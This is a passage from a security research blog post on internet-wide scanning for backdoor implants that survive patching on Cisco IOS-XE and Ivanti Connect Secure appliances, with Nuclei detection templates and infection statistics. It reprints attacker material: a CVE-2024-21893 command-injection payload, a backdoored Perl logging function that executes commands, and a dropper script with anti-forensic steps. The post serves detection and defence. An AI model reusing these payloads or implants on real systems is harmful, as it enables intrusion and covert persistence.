              <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                  <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                  <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
                  <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
                      <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
                  <span class="k">end</span>
                  <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
              <span class="k">end</span>
          <span class="k">end</span>
      <span class="k">end</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 6: Introduced Authorization header mechanism to BadCandy</span></p>

<p>After the Proof of Concept (POC) exploit became public on October 30th, exploitation attempts skyrocketed. Most of these attacks were opportunistic, as is common with popular POCs. A generic way of probing systems for the implant without interacting with the backdoor’s core functionality is to make a request to the uri <code class="language-plaintext highlighter-rouge">/%25</code> on the system (as shown in Listing 7). If the implant is listening, it will return an HTTP 404 response (or a decoy login page in the third version). This is what we used at DIVD to scan for compromised devices with the below template. Scanning for the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint was not an option, as we did not want to interact with the implant’s core functionality and accidentally trigger any unintended effects.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273</span>
<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/%25"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">&lt;head&gt;&lt;title&gt;404</span><span class="nv"> </span><span class="s">Not</span><span class="nv"> </span><span class="s">Found&lt;/title&gt;&lt;/head&gt;"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 7: Nuclei scanning template to detect BadCandy implants</span></p>

<p>Additionally, after the generic attempt started to lose effectiveness, we would scan for the 18-character string and version number (indicated by <code class="language-plaintext highlighter-rouge">content = "/2010202301/"</code> in Listing 5) that would be returned upon setting the <code class="language-plaintext highlighter-rouge">logon_hash</code> parameter, as shown in Listing 8. The cat- and mouse game that resulted from actors changing the implant, forcing us to change our scanning methodology, interestingly shows a textbook attacker-defender dynamic. Again, patching the vulnerability didn’t mean the system was clean, as the number of compromised appliances skyrocketed shortly after the vulnerability was published.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273-v2</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273 v2</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?logon_hash=1"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
        <span class="na">regex</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">.{18}"</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>

  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?menu=1"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">1010202301"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 8: Nuclei scanning template to detect BadCandy implants after generic approach no longer worked accurately</span></p>

<h3 id="results-a-mapped-out-global-infection-flare-up">Results: a mapped-out global infection flare-up</h3>
<p>Roughly three weeks after the vulnerability was published, on October 18, 2023, we measured a total of 72.795 backdoored devices. The United States leads the list by a considerable margin, likely due to its large enterprise router footprint and widespread exposure of the Web UI. Southeast Asia and Latin America also show significant concentrations. Compared to the distribution of the Citrix ADC investigation, the countries affected the most seem to be completely different.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">US</span><span class="p">:</span> <span class="mi">5218</span>  <span class="n">PH</span><span class="p">:</span> <span class="mi">3857</span>  <span class="n">CL</span><span class="p">:</span> <span class="mi">2901</span>  <span class="n">MX</span><span class="p">:</span> <span class="mi">2568</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2154</span>
<span class="n">TH</span><span class="p">:</span> <span class="mi">1862</span>  <span class="n">PE</span><span class="p">:</span> <span class="mi">1829</span>  <span class="n">BE</span><span class="p">:</span> <span class="mi">1321</span>  <span class="n">AT</span><span class="p">:</span> <span class="mi">1105</span>  <span class="n">BR</span><span class="p">:</span> <span class="mi">1073</span>
<span class="n">CH</span><span class="p">:</span> <span class="mi">1043</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">986</span>  <span class="n">GB</span><span class="p">:</span> <span class="mi">966</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">964</span>  <span class="n">AU</span><span class="p">:</span> <span class="mi">875</span>
<span class="n">DE</span><span class="p">:</span> <span class="mi">860</span>  <span class="n">NL</span><span class="p">:</span> <span class="mi">750</span>  <span class="n">EC</span><span class="p">:</span> <span class="mi">714</span>  <span class="n">FR</span><span class="p">:</span> <span class="mi">696</span>  <span class="n">RU</span><span class="p">:</span> <span class="mi">620</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 9: Top 20 countries with BadCandy implants on October 18th, 2023</span></p>

<p>All system owners that were compromised received a notification about the implant, steps to remediate, and advice on how to proceed. While Cisco themselves attempted to bury these numbers, collective effort from the industry brought down the infection rate and number of compromised hosts significantly over the months after.</p>

<h2 id="ivanti-connect-secure---cve-2024-21893">Ivanti Connect Secure - CVE-2024-21893</h2>
<p>A few months later, on January 31st, 2024, Ivanti <a href="https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways">released</a> fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. One of the first to publish a report on the implants resulting from these attacks was <a href="https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor">Orange Cyberdefense</a>, who named it the DSLog backdoor.</p>

<p>As with the previous cases, post-exploitation scanning revealed compromises that would have gone unnoticed by standard vulnerability checks.</p>

<h3 id="scanning-for-the-backdoors-2">Scanning for the Backdoors</h3>
<p>An important aspect of scanning for the DSLog backdoor is the first stage of the exploit, shown in Listing 9. The payload outputs either a set of random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code> to a publicly accessible file (index.txt, index1.txt, index2.txt, etc.). This seemed to be reconnaissance activity (shown in Listing 10) to confirm that the exploit worked on the target device, an idea that is corroborated by Orange Cyberdefense. Interestingly, in 1cases where the attackers cleared the log files, the <code class="language-plaintext highlighter-rouge">uname -a</code> output offered a timestamp on the time of compromise, which is temporal evidence for the breach.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Base64 encoded request</span>
https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo </span>ZWNobyAkKHVuYW1lIC1hO2lkKT4vaG9tZS93ZWJzZXJ2ZXIvaHRkb2NzL2RhbmEtbmEvaW1ncy9pbmRleDIudHh0|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>

<span class="c"># Decoded command</span>
https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo</span> <span class="si">$(</span><span class="nb">uname</span> <span class="nt">-a</span><span class="p">;</span><span class="nb">id</span><span class="si">)</span><span class="o">&gt;</span>/home/webserver/htdocs/dana-na/imgs/index2.txt|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>

<span class="c"># Output in index2.txt</span>
Linux localhost2 2.6.32-00032-g2005e8d-dirty <span class="c">#1 SMP Thu Jun 22 03:40:39 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux uid=0(root) gid=0(root) groups=0(root)</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 10: SSRF payload for CVE-2024-21893</span></p>

<p>With the knowledge of now, the methodology and characteristics of the backdoor <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability">closely resemble</a> the suspected China-nexus espionage actor tracked as UNC5221 (Mandiant) or UTA0178 (Volexity). At the time, IBM <a href="https://www.ibm.com/think/x-force/exploitation-of-exposed-ivanti-vulnerabilities">wrote a blogpost</a> that mentioned the involvement of UNC5221 based on other reporting, but also admitted they could not corroborate these findings with sufficient confidence. The type, way of dropping, and chosen locations of the webshell seem to be similar to the later Ivanti Connect Secure webshells attributed to UNC5221, such as the webshells related to <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement">SPAWNANT</a> installer and <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">PHASEJAM</a> dropper.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">sub </span><span class="nf">Msg</span> <span class="p">{</span>
  <span class="k">my</span> <span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nv">@_</span><span class="p">;</span>
  <span class="k">my</span> <span class="p">(</span><span class="nv">$pkg</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">)</span> <span class="o">=</span> <span class="nb">caller</span><span class="p">;</span>
  <span class="k">my</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">HTTP_USER_AGENT</span><span class="p">};</span>
  <span class="k">my</span> <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">QUERY_STRING</span><span class="p">};</span>
  <span class="k">my</span> <span class="nv">$qur</span> <span class="o">=</span> <span class="p">"</span><span class="s2">&lt;redacted&gt;</span><span class="p">";</span>
  <span class="k">my</span> <span class="nv">@param</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/&amp;/</span><span class="p">,</span> <span class="nv">$req</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">index</span><span class="p">(</span><span class="nv">$ua</span><span class="p">,</span> <span class="nv">$qur</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]){</span>
      <span class="k">my</span> <span class="nv">@res</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/=/</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">cdi</span><span class="p">"){</span>  <span class="c1"># Include command in cdi parameter</span>
        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/</span><span class="nv">eg</span><span class="p">;</span>
        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">tr/!-~/P-~!-O/</span><span class="p">;</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$</span><span class="p">{</span><span class="nv">res</span><span class="p">[</span><span class="mi">1</span><span class="p">]});</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">substr</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nb">rindex</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="p">"</span><span class="s2">/</span><span class="p">")</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
  <span class="c1"># Prevent C printf format codes to make it through...</span>
  <span class="nv">$data</span> <span class="o">=~</span> <span class="sr">s/%/%%/g</span><span class="p">;</span>
  <span class="nv">Msg_impl</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>
<p><span class="centered-text">Listing 11: Modified function in the /home/perl/DSLog.pm file</span></p>

<p>Listing 11 shows the altered <code class="language-plaintext highlighter-rouge">Msg()</code> function on line 102 in the <code class="language-plaintext highlighter-rouge">/home/perl/DSLog.pm</code> file that includes the implant. DSLog.pm is normally a legitimate script that is used to log events on the Ivanti appliance. Commands can be executed through the shell by adding the (URL-encoded) command to the request with the <code class="language-plaintext highlighter-rouge">cdi</code> parameter. The added code is injected using the exploit shown in Listing 10, but this time with the base64-encoded payload shown in Listing 12. The payload checks if the device has already been infected, after which it writes the implant to the DSLog file and performs some anti-forensics.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set paths to target files</span>
<span class="nv">DESTFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLog.pm"</span>
<span class="nv">CLFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLogMB.pm"</span>

<span class="c"># Check if the file already contains HTTP_USER_AGENT</span>
<span class="k">if </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'HTTP_USER_AGENT'</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s1">'OK'</span>
<span class="k">else</span>
    <span class="c"># Inject Perl code starting at line 102</span>
    <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'102i\
my $ua = $ENV{HTTP_USER_AGENT};\
my $req = $ENV{QUERY_STRING};\
my $qur = "&lt;redacted&gt;";\
my @param = split(/&amp;/, $req);\
if (index($ua, $qur) != -1) {\
    if ($param[1]) {\
        my @res = split(/=|,/, $param[1]);\
        if ($res[0] eq "cdi") {\
            $res[1] =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;\
            $res[1] =~ tr/!-/P-~/P-~.!-O/;\
            system($res[1]);\
        }\
    }\
}'</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>
<span class="k">fi</span>

<span class="c"># Sync timestamp of DESTFILE to match CLFILE (anti-forensics)</span>
<span class="nb">touch</span> <span class="nt">-r</span> <span class="s2">"</span><span class="nv">$CLFILE</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>

<span class="c"># Clear crash dump traces</span>
<span class="nb">rm</span> <span class="nt">-rf</span> /var/cores/<span class="k">*</span>

<span class="c"># Run a Python warm restart with shellcode injection via base64 decoding</span>
/home/venv3/bin/python3 <span class="nt">-c</span> <span class="s1">'import DSMonitor; DSMonitor.warmRestart()'</span> | /usr/bin/base64 <span class="nt">-d</span> | /bin/bash
</code></pre></div></div>
<p><span class="centered-text">Listing 12: Exploit payload to drop the implant</span></p>

<p>Because the implant contains a unique key (SHA256 hash) that needs to be included in the User Agent to execute commands, there was no way to directly interact with it. However, the initial stage of the compromise included the creation of a publicly available file that contained predictable output. Therefore, this offered a scanning methodology to at least gain an indication that the implant had been present on the system.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">CVE-2024-21893</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">DSLog backdoor Ivanti Connect Secure</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">variables</span><span class="pi">:</span>
  <span class="na">index</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">index.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index1.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index2.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index3.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index4.txt"</span><span class="pi">]</span>

<span class="na">requests</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">GET</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/dana-na/imgs/"</span>

    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">WatchGuard"</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>
        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>

      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">dsl</span>
        <span class="na">dsl</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">len(body)</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">0</span><span class="nv"> </span><span class="s">&amp;&amp;</span><span class="nv"> </span><span class="s">status_code</span><span class="nv"> </span><span class="s">==</span><span class="nv"> </span><span class="s">200"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 13: Nuclei scanning template for the DSLog implant</span></p>

<p>These files offered sufficient coverage to locate the DSLog backdoor in a scanning campaign. We did not have to approach the implant itself, which is always important from the ethics perspective. Instead of probing the implant directly, we scanned for signs of dropped index files using the method in Listing 13. Normally, the Ivanti Connect Secure appliances will return an HTTP 404 upon making a request to an endpoint that does not exist. Therefore, by scanning for HTTP 200 responses on the known indicators and verifying the content of the response, public systems could be scanned for this webshell. The only thing to take into account is to filter out the occasional WatchGuard WAF response.</p>

<h3 id="results-little-but-interesting-targets">Results: little but interesting targets</h3>
<p>Two weeks after the vulnerability became public, on February 12th, 2024, we conducted a scan for the DSLog backdoor and found 50 backdoored instances in 17 countries. With such little results, it becomes interesting to look at the types of organizations that were backdoored. In this instance, most organizations that were compromised seemed to belong to either the steel, healthcare (robotics), telecommunications, or banking sector.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">US</span><span class="p">:</span> <span class="mi">18</span>  <span class="n">JP</span><span class="p">:</span> <span class="mi">6</span>  <span class="n">KR</span><span class="p">:</span> <span class="mi">4</span>  <span class="n">HK</span><span class="p">:</span> <span class="mi">3</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">CN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">DE</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">ZA</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">BH</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">FR</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">ES</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">MY</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">CA</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">TR</span><span class="p">:</span> <span class="mi">1</span>
<span class="n">NL</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">1</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 14: Countries with DSLog implants on February 12th, 2024.</span></p>

<p>After conducting a notification campaign and sharing the information through the appropriate channels, the implants were largely taken down. On April 4th, 2024, there were eight remaining implants. These implants are active to this day.</p>

<h1 id="conclusion-when-fixing-isnt-enough">Conclusion: when fixing isn’t enough</h1>
<p>Patching is a vital part of vulnerability management, but as the case studies in this blog post show, it is no longer sufficient on its own. Persistent backdoors can survive patch windows, quietly operating long after the initial exploit has been closed. If defenders stop looking once the CVE is fixed, they risk missing the real threat: compromise that has already taken root.</p>

<p>Ethical, public-interest scanning helps fill this gap. By focusing on behavioral residues and side channels, we can responsibly detect implants without triggering them and incorporate this into our scanning routines. As vulnerability researchers and incident responders, our responsibility should extend beyond identifying vulnerabilities alone. Finding these implants using responsible methods is part of a broader mission to protect the public interest and support those who may not even realize they are at risk.</p>

<p>This is a reminder that vulnerability response must move beyond the binary of “patched or not” and instead ask the harder question: was the adversary already inside? Until vendors and defenders treat post-patch compromise as a first-class threat model, this work will remain essential—and at times, the only line of defense. Patching closes the door, but unless we check the locks, the intruder may still be inside.</p>
</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2025-06-14T00:00:00+02:00"><!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div itemscope itemtype="http://schema.org/Person" class="author-profile card card--flat item"><a href="https://disclosing.observer" class="item__image"><img class="author-profile__avatar" itemprop="image" src="https://avatars.githubusercontent.com/u/25766540" /></a><div class="item__content"><meta itemprop="name" content="Max van der Horst">
        <p class="author-profile__name"><meta itemprop="url" content="https://disclosing.observer">
            <a href="https://disclosing.observer">Max van der Horst</a></p><p itemprop="description">Author</p><div class="author-profile__links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"><link itemprop="url" href="https://disclosing.observer"><li title="Send me an Email.">
      <a class="button button--circle mail-button" itemprop="email" href="mailto:mhvanderhorst@tudelft.nl" target="_blank">
        <i class="fas fa-envelope"></i>
      </a><li title="Follow me on Linkedin.">
        <a class="button button--circle linkedin-button" itemprop="sameAs" href="https://www.linkedin.com/in/MaxHorst" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M260.096 155.648c0 27.307008-9.899008 50.516992-29.696 69.632-19.796992 19.115008-45.396992 28.672-76.8 28.672-30.036992 0-54.612992-9.556992-73.728-28.672-19.115008-19.115008-28.672-42.324992-28.672-69.632 0-28.672 9.556992-52.224 28.672-70.656 19.115008-18.432 44.372992-27.648 75.776-27.648 31.403008 0 56.32 9.216 74.752 27.648 18.432 18.432 28.331008 41.984 29.696 70.656 0 0 0 0 0 0m-202.752 808.96c0 0 0-632.832 0-632.832 0 0 196.608 0 196.608 0 0 0 0 632.832 0 632.832 0 0-196.608 0-196.608 0 0 0 0 0 0 0m313.344-430.08c0-58.708992-1.364992-126.292992-4.096-202.752 0 0 169.984 0 169.984 0 0 0 10.24 88.064 10.24 88.064 0 0 4.096 0 4.096 0 40.96-68.267008 105.812992-102.4 194.56-102.4 68.267008 0 123.220992 22.868992 164.864 68.608 41.643008 45.739008 62.464 113.664 62.464 203.776 0 0 0 374.784 0 374.784 0 0-196.608 0-196.608 0 0 0 0-350.208 0-350.208 0-91.476992-33.451008-137.216-100.352-137.216-47.787008 0-81.236992 24.576-100.352 73.728-4.096 8.192-6.144 24.576-6.144 49.152 0 0 0 364.544 0 364.544 0 0-198.656 0-198.656 0 0 0 0-430.08 0-430.08 0 0 0 0 0 0" />
</svg>
</div>
        </a>
      </li><li title="Follow me on Github.">
        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/Maximand" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
</svg>
</div>
        </a>
      </li></ul>
</div>
</div>

    </div>
</div>
<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
</div><div class="article__license"><div class="license">
